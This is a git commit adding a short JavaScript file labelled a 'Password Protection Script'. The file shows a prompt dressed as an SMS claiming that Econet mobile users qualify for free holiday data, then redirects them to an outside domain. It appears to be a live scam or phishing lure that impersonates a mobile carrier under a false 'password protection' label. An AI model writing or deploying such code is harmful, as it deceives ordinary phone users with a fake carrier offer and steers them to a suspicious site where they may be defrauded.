807d60fffb40d6b1dcdbe3e3d40dedf5d30ca33b
mfednewblog9 <newekpeitid@gmail.com>
2025-12-24 11:23:34 +0100

    Create econet-active.js

---
+++ econet-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your Econet Number is eligible to receive Christmas and new year offer. Please press OK to Enter your Number.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://fhreekift.org/econet.html';
+}
